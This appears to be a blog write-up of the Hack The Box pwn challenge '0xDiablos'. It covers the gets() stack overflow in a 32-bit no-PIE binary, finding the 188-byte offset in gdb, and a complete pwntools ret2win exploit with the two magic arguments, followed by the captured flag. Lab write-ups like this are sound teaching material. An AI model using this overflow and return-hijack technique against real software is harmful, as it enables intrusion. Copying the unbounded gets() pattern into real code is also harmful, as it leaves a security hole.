---
layout: post
title: "0xDiablos (HTB pwn)"
subtitle: "classic gets() stack overflow, return into flag() with the two magic args"
date: 2023-04-23
tags: [htb, ctf, pwn, buffer-overflow, ret2win]
category: writeups
kind: challenge
tldr: "A 32-bit no-PIE binary reads into a 180-byte buffer with gets(). I overflowed 188 bytes to the saved return address, pointed it at flag(), and stacked a fake return plus the two argument values flag() checks (0xdeadbeef, 0xc0ded00d) so it printed the flag."
---

## the challenge

0xDiablos (the full HTB name is "You know 0xDiablos") is a starter pwn challenge. I got a single 32-bit Linux ELF named `vuln` and a remote instance to run it against. The win condition is to read `flag.txt`, which the program only opens inside a function it never calls on a normal run.

First thing I checked was the file type and the mitigations.

```text
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, ... not stripped
```

```text
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

That readout is the easy mode. No stack canary means I can smash the saved return address without tripping a guard. No PIE means every function sits at a fixed address I can hardcode (base `0x8048000`). NX disabled and RWX segments would matter if I needed to run shellcode, but I did not. The binary is `not stripped`, so `flag`, `vuln`, and `main` all show up by name.

## the bug

`main` does the usual setup and then hands control to `vuln()`:

```c
undefined4 main(undefined1 param_1)
{
  __gid_t __rgid;
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

`vuln()` is the whole problem:

```c
void vuln(void)
{
  char local_bc [180];
  gets(local_bc);
  puts(local_bc);
  return;
}
```

`gets()` reads a line with no length limit. The destination is a 180-byte stack buffer. Anything I type past the buffer keeps writing up the stack, over the saved `EBP` and then the saved return address. The matching disassembly shows the frame layout:

```asm
08049272 <vuln>:
 8049272: push   ebp
 8049273: mov    ebp,esp
 8049276: sub    esp,0xb4              ; 0xb4 = 180 frame bytes
 ...
 804928a: lea    eax,[ebp-0xb8]        ; buffer starts at ebp-0xb8
 8049290: push   eax
 8049291: call   8049040 <gets@plt>
 ...
 80492af: leave
 80492b0: ret
```

The buffer is at `ebp-0xb8`, which is `184` bytes below saved `EBP`. So `184` bytes fill the buffer up to saved `EBP`, the next `4` overwrite saved `EBP`, and the `4` after that land on the saved return address. That puts the return address at offset `188`, which I confirmed empirically below.

There is also a `flag()` function that nothing ever calls:

```c
void flag(int param_1,int param_2)
{
  char flag [64];
  FILE *fd;
  fd = fopen("flag.txt","r");
  if (fd != (FILE *)0x0) {
    fgets(flag,0x40,fd);
    if ((param_1 == -559038737) && (param_2 == -1059139571)) {
      printf(flag);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
  exit(0);
}
```

The two constants `-559038737` and `-1059139571` are just the signed reading of `0xdeadbeef` and `0xc0ded00d`. Ghidra prints them signed because it typed the params as `int`. The raw disassembly shows the unsigned comparison plainly:

```asm
080491e2 <flag>:
 ...
 8049246: cmp    DWORD PTR [ebp+0x8],0xdeadbeef    ; param_1
 804924d: jne    8049269 <flag+0x87>
 804924f: cmp    DWORD PTR [ebp+0xc],0xc0ded00d    ; param_2
 8049256: jne    804926c <flag+0x8a>
 8049258: sub    esp,0xc
 804925b: lea    eax,[ebp-0x4c]
 804925e: push   eax
 804925f: call   8049030 <printf@plt>             ; printf(flag)
```

So this is ret2win with an argument gate. I needed to overwrite the saved return address with `flag()` (`0x080491e2`) and place `0xdeadbeef` and `0xc0ded00d` where `flag()` reads `[ebp+0x8]` and `[ebp+0xc]`.

## the solve

### finding the offset

I drove it under gdb-peda. Break on `vuln`, generate a 200-byte cyclic pattern, send it into `gets()`, let `ret` execute, and read which four bytes ended up in `EIP`.

```text
gdb-peda$ pattern create 200
gdb-peda$ run
... (paste pattern at the gets prompt) ...
EBP: 0x41594141 ('AAYA')
EIP: 0x41417741 ('AwAA')
gdb-peda$ pattern offset 0x41417741
1094809409 found at offset: 188
```

The pattern offset landed `EIP` at `188`, matching the static math (`184` buffer + `4` saved EBP). That is the distance from the start of my input to the saved return address.

### laying out the stack

On a 32-bit cdecl call, when `flag()` starts executing, the stack reads top-down as: its own saved return address, then `arg1`, then `arg2`. `flag()` reaches arguments via `[ebp+0x8]` and `[ebp+0xc]`, which after its prologue (`push ebp; mov ebp,esp`) point at exactly the dwords sitting just past the return slot.

So after the 188 bytes of padding I wrote:

1. `p32(0x080491e2)` to overwrite the saved return address with `flag()`.
2. Four filler bytes (`b"AAAA"`) that become `flag()`'s own return address. I never return cleanly from `flag()`, so this can be anything.
3. `p32(0xdeadbeef)` as `param_1`.
4. `p32(0xc0ded00d)` as `param_2`.

The exploit:

```python
from pwn import *

buffer_size = 188            # offset to the saved return address
padding     = b"AAAA"        # fake return address for flag(), never used
flag_address = 0x080491e2
param_1      = 0xdeadbeef
param_2      = 0xc0ded00d

payload = (
    b"A" * buffer_size +
    p32(flag_address) +
    padding +
    p32(param_1) +
    p32(param_2)
)

connection = remote("188.166.171.200", 30655)
connection.sendline(payload)
connection.interactive()
```

`p32()` lays each dword down little-endian, so `0x080491e2` becomes the bytes `e2 91 04 08` on the wire, which is what the `ret` pops into `EIP`.

## the flag

When `vuln()` hit `ret`, it popped my `flag()` address into `EIP` and jumped there. `flag()` opened `flag.txt`, read it into its local buffer, hit the two `cmp` checks, and both passed because `0xdeadbeef` and `0xc0ded00d` were sitting exactly where `[ebp+0x8]` and `[ebp+0xc]` resolve. `printf(flag)` then ran and the contents came back over the connection:

```text
HTB{0ur_Buff3r_1s_not_healthy}
```

The flag reads like a note about the state of the buffer, which is the point. The whole chain is: unbounded `gets()` overflow, fixed addresses thanks to no PIE, no canary to stop the smash, and a convenient win function that only needed two hardcoded arguments dropped in the right stack slots.
